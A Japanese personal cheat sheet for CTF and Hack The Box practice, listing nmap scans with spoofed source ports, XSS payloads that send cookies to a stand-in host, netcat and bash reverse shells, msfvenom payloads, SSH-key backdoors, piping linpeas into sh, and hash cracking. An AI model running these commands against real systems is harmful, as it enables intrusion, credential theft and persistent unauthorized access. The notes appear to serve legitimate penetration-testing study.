# Memo
### ctfとかhtbとか  

#### nmap

```sudo nmap -sS -p- IP```  
全ポートのスキャン(時間はかかる)  

```nmap -sV -Pn -A -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8065,8080,8443,8888 IP```  
> -sV -A  

でバージョン情報とかを得るようになる(指定しているポートは可能性のありそうなポート)  

```nmap -sV -A -g 53 -p 21-25,35,43,69,80-88,107-110,115,118,123,137-139,143,156,161-162,220,384,389,443-445,465,514,530,543-544,591,593,636,901-903,953,992,995,1025,1433-1434,1812,3000,3306,3389,3535,5000,5432,7777,8008,8065,8080,8443,8888 IP```  
> -g 53  

で送信元ポートを53(DNS)に偽装する  

<br>  

#### XSS  
```'';!--"<XSS>=&{()}```  
> 上を入力して表記が崩れたらXSSいけるかも  
> 参考 https://jpcertcc.github.io/OWASPdocuments/CheatSheets/XSSFilterEvasion.html#XSS_Locator  

```<script>fetch('https://requestbin.example.com?data=${document.cookie}')</script>```  
> 上のはCookieをrequestbin.example.com(例なので存在しない)に送信するスクリプト  
> 上のrequestbin.example.comに対応するものは例えばhttps://requestbin.com/  

```<script src="data:,document.location='https://requestbin.example.com?data='+document.cookie"></script>```  
> こっちも有り  

<br>  

#### webshell   
```/usr/share/webshells/php/simple-backdoor.php```
> Kaliにはwebshellも用意されている  

<br>  

#### 権限昇格関連  
```sudo -l```  
> まずはNOPASSWORDで何が出来るか調べる．  

```ps aux```  
> 実行中のプロセスを表示  

```sudo -u#-1 whoami```  
> CVE-2019-14287  

```attacker:~/enum$ sudo python -m SimpleHTTPServer 80```  
```victim$ curl attackerIP/linpeas.sh | sh```  
> attacker:~/enumフォルダには  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
https://github.com/diego-treitos/linux-smart-enumeration  
https://github.com/rebootuser/LinEnum  
などのEnumツールが入ってると仮定  
上の例ではlinpeas.shを指定している  

###### 権限昇格Memo  
```パスワードとかがあったら使い回せないか調べる．```  
```実行可能なファイル（普段はなさそうなもの）を探す．```  
```設定ファイル(config)```  
```バックアップ(.old, .bak)```  


<br>  

#### SQL  
##### MySQL  
```mysql -u root -p```  
> mysqlにrootユーザで接続  

```SHOW DATABASES;```  
> データベース一覧取得  

```use databasename```  
> databasenameで指定したデータベースを選択  

```SHOW TABLES;```  
> テーブル一覧取得  

```SELECT * FROM `tabelename`;```  
> tabelenameで指定したテーブルの内容を取得  

```\! command```  
> 一応commandは実行できる  

<br>  

#### Hash  

```hashcat -m 3200 -a 0 'HashHere' -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt```  
> -m 3200はhashのタイプをbcryptに指定する  
> 上は一つの例 実際に上のルールをrockyou.txtに指定するととても時間がかかる．

<br>  

#### Metasploit  
```use exploit/multi/handler```  
```set payload linux/x64/shell_reverse_tcp ```  
```set lhost [IP]```  
```set lport [port]```  
```run```  
> handler起動  
> 上の例はx64 Linux でReverse TCPを指定  
> [IP]に指定するのは攻撃者側のIP  
> [port]に指定するのは攻撃者側のport(規定値は4444)  

```meterpreter> background```  
> sessionをバックグランドに回す

```use multi/recon/local_exploit_suggester```  
> sessionが確立された後に，そのセッションを指定してrunすると使えそうな脆弱性を洗い出してくれる．  


#### msfvenom  
```msfvenom -l payload```  
> payloadの確認  

```msfvenom -l format```  
> formatの確認  

```/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe```  
> msfvenom使用例  
> -pでpayload指定  
> -fでformat指定  
> payloadにmeterpreterが入っているもをの指定した場合は，msfconsoleのexploit/multi/handlerで待ち受けする(payloadはmsfvenomで使用したものと同じものを指定)  







#### backdoor  
```nc -l -n 7777 -e /usr/bin/bash```  
> 被攻撃サーバにbackdoorを作成  
```nc ip 7777```  
> backdoorに接続  

```nc -lnvp [port]```  
```bash -i >& /dev/tcp/[ip]/[port] 0>&1```  

> backdoor example

```kali$ ssh-keygen ./id_rsa```  
```kali$ cat id_rsa.pub```  
```victim$ vi ~/.ssh/authorized_keys```  
```id_rsa.pubの中身をそのままauthorized_keysにコピー```  
```kali$ ssh -i ./id_rsa victim@ip```  
> sshの公開鍵で接続できるようにする


#### RSA  
```openssl rsautl -encrypt -inkey private_key -in plain.txt -out encrypted```  
> private_keyには秘密鍵のファイルを指定  
> plain.txtには暗号化したいファイルを指定  

```openssl rsautl -encrypt -pubin -inkey public_key -in plain.txt -out encrypted```  
> 公開鍵で暗号化する方法  

```openssl rsautl -decrypt -inkey private_key -in encrypted -out decrypted.txt```  
> 秘密鍵で復号する方法  



> RSAの脆弱性等をつくツール  

#### OllyDbg  
```
F2：ブレークポイント設定/解除
F7：詳細ステップ実行(ステップイン：関数内部まで入り実行)
F8：ステップ実行(ステップオーバー：関数呼び出しを1命令として実行)
F9：デバッギー実行
Ctrl+F2:再スタート
F12：デバッギー実行一時停止
Ctrl+F9：リターンまで実行
Alt+F9：ユーザーコードまで実行(システムDLL内から抜ける際等に使用)
Space：アセンブル
Ctrl+E：バイナリデータの編集
Ctrl+G：アドレスを指定して移動
ESC：詳細自動ステップ実行の停止
```  
> ショートカット一覧  

#### gdb-peda  
```gdb```  
> gdb-peda起動  
> pedaを入れているのにgdbが起動してしまう場合は以下を実行  

```echo "source ~/peda/peda.py" >> ~/.gdbinit```  

```gdb-peda$ attach PID```  
> 起動中のプロセスにアタッチPIDはps auxとかで調べる．  

```gdb-peda$ r```  
> 実行  

```gdb-peda$ b main```  
```gdb-peda$ b *0xffffffff```  
> ブレークポイント設定  
> 上はmain関数に設定  
> 下は0xffffffffアドレスに設定  

```gdb-peda$ ni```  
> ステップ実行  

```gdb-peda$ c```  
> 次のブレークポイントまで実行  

```gdb-peda$ x/12xw $ebp```  
> 格納されている値を見る  

```gdb-peda$ set $eip=0xffffffff```  
> 値の書き換え  

```gdb-peda$ pattern_create```  
> BOFとかでアドレスの位置を知りやすくするための入力値を生成  

```gdb-peda$ patto AAFA```  
> AAFAまでのオフセットを取得  

```gdb-peda$ p 0x5a-0x4```  
> 16進数の値計算が出来る  



#### socat  
```socat TCP-LISTEN:4445,fork EXEC:"./vuln"```  
> ./vulnにlocalhost:4445でアクセス可能  


#### Windows でcmdかpowershellから外部のファイルをダウンロードさせる方法  
```powershell```  
```$client = new-object System.Net.WebClient```  
```$client.DownloadFile("http://example.com/content/","C:\Users\Administrator\Desktop\file.txt")```  
> powershellコマンドは初めからpowershellが取れている場合は必要ない．
> example.com/contentの部分を取得したいコンテンツに書き換え，C:\Users\Administrator\Desktop\file.txtの部分をダウンロード先に置き換える．  
> ※wget やcurlが使えるならそっち使った方が早い  


#### GitLab  
```git cat-file -p [40文字]```  
> 参考 https://www.yoheim.net/blog.php?q=20140210



#### Shellが安定しないとき  
```script -c "/bin/bash -i" /dev/null```  
```python3 -c "import pty;pty.spawn('/bin/bash')"```  
```/bin/bash -i```  

> ちょっと使いやすくなるかも  

#### Bash系?  
```echo "aa\nbb\ncc" | sed 's/\\n/\```  
```/g'```  
> \nを改行に変換  


#### pwn  
```nm a.out```  
> 実行ファイル中のシンボルを表示  


#### Windows cmd  
```dir /s root.txt```  
> カレントディレクトリからサブディレクトリを辿ってroot.txtを検索  



<br>  

#### レポート  
```script filename```
> ターミナルの出力(ログ)をfilenameに記録できる  

```less -r logfile```  
> scriptコマンドで出力したログを表示  



<br>  

#### スタック時のアドバイス  
・キーワードになりそうなもの(些細なものでも)を一旦メモか何かにまとめる．  
